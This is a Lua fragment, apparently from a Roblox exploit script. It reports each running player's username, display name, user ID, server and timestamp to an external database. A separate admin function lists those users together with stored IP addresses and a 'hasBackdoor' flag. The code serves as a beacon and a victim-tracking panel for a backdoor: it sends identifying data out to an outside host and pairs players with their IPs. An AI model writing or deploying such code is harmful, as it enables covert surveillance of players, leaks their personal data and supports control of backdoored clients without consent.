local function updatePresence()
    local data = table.concat({
        LP.DisplayName,
        LP.Name,
        game.PlaceId,
        game.JobId:sub(1, 8),
        tick(),
        LP.UserId,
        "true"
    }, "§")
    dbSet(MY_KEY, data, DB_TTL)
end

local function fetchUsers()
    if not isAdmin then return end
    
    local ok, data = pcall(function()
        return HS:GetAsync(DB_BASE .. "?prefix=presence_&format=keys", true)
    end)
    if not ok then return end
    
    local newReg = {}
    for key in data:gmatch("[^\n]+") do
        if key:sub(1, 9) == "presence_" then
            local uid = key:sub(10)
            local raw = dbGet(key)
            if raw then
                local parts = raw:split("§")
                if #parts >= 6 then
                    local ip = dbGet("ip_" .. uid)
                    newReg[uid] = {
                        name = parts[1],
                        display = parts[2],
                        place = parts[3],
                        job = parts[4],
                        time = tonumber(parts[5]) or 0,
                        same = (parts[4] == game.JobId:sub(1, 8)),
                        hasBackdoor = parts[7] == "true",
                        ip = ip or "Unknown"
                    }
                end
            end
        end
    end
    Registry = newReg
    
    if AdminWindow and AdminWindow.Parent then
        pcall(function()
            for _, child in ipairs(AdminWindow:GetDescendants()) do
                if child:IsA("ScrollingFrame") then
                    -- Обновление будет через refreshList
                end
            end
        end)
    end
end

